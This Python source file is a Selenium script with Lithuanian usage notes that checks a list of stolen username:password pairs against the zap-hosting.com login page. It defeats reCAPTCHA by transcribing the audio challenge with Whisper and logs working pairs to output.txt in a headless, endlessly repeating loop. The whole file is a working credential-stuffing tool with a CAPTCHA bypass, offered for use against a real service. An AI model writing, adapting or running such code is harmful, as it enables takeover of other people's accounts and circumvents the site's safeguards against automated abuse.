import os, random, time, ffmpeg, requests, json, whisper, warnings, logging
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException   
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import UnexpectedAlertPresentException
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from numba.core.errors import NumbaDeprecationWarning, NumbaPendingDeprecationWarning

warnings.simplefilter('ignore', category=NumbaDeprecationWarning)
warnings.simplefilter('ignore', category=NumbaPendingDeprecationWarning)
logging.getLogger('urllib3').setLevel(logging.WARNING)
logging.getLogger('selenium').setLevel(logging.WARNING)
warnings.filterwarnings("ignore")
model = whisper.load_model("base")


def transcribe(url):
    with open('.temp', 'wb') as f:
        f.write(requests.get(url).content)
    result = model.transcribe('.temp')
    return result["text"].strip()

def click_checkbox(driver):
    wait = WebDriverWait(driver, 30)
    driver.switch_to.default_content()
    driver.switch_to.frame(wait.until(EC.presence_of_element_located((By.XPATH, ".//iframe[@title='reCAPTCHA']"))))
    driver.find_element(By.XPATH, "//*[@id='recaptcha-anchor']/div[1]").click()
    driver.switch_to.default_content()

def request_audio_version(driver):
    wait = WebDriverWait(driver, 30)
    driver.switch_to.default_content()
    driver.switch_to.frame(driver.find_element(By.XPATH, ".//iframe[@title='recaptcha challenge expires in two minutes']"))
    wait.until(EC.presence_of_element_located((By.XPATH, "//*[@id='recaptcha-audio-button']"))).click()

def solve_audio_captcha(driver):
    wait = WebDriverWait(driver, 30)
    text = transcribe(driver.find_element(By.ID, "audio-source").get_attribute('src'))
    driver.find_element(By.ID, "audio-response").send_keys(text)
    driver.find_element(By.ID, "recaptcha-verify-button").click()


def executor(driver, username, password):
    mainWin = driver.current_window_handle
    wait = WebDriverWait(driver, 30)
    log_page = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="quick-register-form"]/a')))
    log_page.send_keys(Keys.RETURN)
    
    username_field = driver.find_element(By.XPATH, '//*[@id="jumbotron-login"]/div/form/input[2]')
    password_field = driver.find_element(By.XPATH, '//*[@id="jumbotron-login"]/div/form/input[3]')
    
    username_field.send_keys(username)
    password_field.send_keys(password)
    
    # reCAPTCHA SOLVER - start
    time.sleep(5)
    click_checkbox(driver)
    time.sleep(10)
    request_audio_version(driver)
    time.sleep(2)
    solve_audio_captcha(driver)
    time.sleep(1)
    
    # reCAPTCHA SOLVER - end
    try:
        driver.find_element(By.XPATH, '//*[@id="exit-intent-component"]/div/div[2]/div/div/div[1]/div/button').click()
        driver.switch_to.window(mainWin)
        login_button = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="jumbotron-login"]/div/form/button')))
        login_button.send_keys(Keys.RETURN)
    except:
        driver.switch_to.window(mainWin)
        login_button = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="jumbotron-login"]/div/form/button')))
        login_button.send_keys(Keys.RETURN)
    
    if 'customer' in driver.current_url:
        print(f'WORKING: {username}:{password}\n')
        with open('output.txt', 'a') as file:
            file.write(f'{username}:{password}\n')
        delete_credentials(username, password)
    else:
        print(f'FAILED: {username}:{password} \n')
        delete_credentials(username, password)
    driver.quit()


def delete_credentials(username, password):
    with open('credentials.txt', 'r') as file:
        lines = file.readlines()

    with open('credentials.txt', 'w') as file:
        for line in lines:
            if line.strip() != f'{username}:{password}':
                file.write(line)


def checker_function():
    with open('credentials.txt', 'r') as file:
        lines = file.readlines()
    if len(lines) == 0: 
        print("[ERROR]: credentials.txt is empty!")
        raise ValueError("[ERROR]: credentials.txt is empty!")
    else:
        options = Options()
        options.add_argument('--headless')
        options.add_argument('--log-level=3')
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_experimental_option('excludeSwitches', ['enable-logging'])
        service = Service(ChromeDriverManager(version='114.0.5735.90').install())
        driver = webdriver.Chrome(service=service, options=options)
        driver.get('https://zap-hosting.com/en')
        for line in lines:
            username, password = line.strip().split(':')
            executor(driver, username, password)

is_finished = True
while True:
    if is_finished:
        checker_function()
        is_finished = False
    else:
        time.sleep(1)
        continue
    checker_function()
    print("Last iteration finished.")
    is_finished = True

# ========================== #
#     SVARBI INFORMACIJA
# ========================== #

# 113 EILUTĖ:
# options.add_argument('--headless')
# Padaro, kad nerodytu Chrome lango ir procesas vykdytų backgrounde (nematomas langas).
# Norint matyti Chrome UI, prieš tą eilutė reikia padėti `#`.

# IMPORTAI:
# Visus importus galima atsisiųsti naudojant komandą: `pip install -r requirements.txt`.

# PALEIDIMAS:
# `python app.py`

# PASTABA: Privaloma naudoti visas komandas toje konsolės kategorijoje, kur yra išsaugoti 
# visi 4 pagrindiniai programos failai.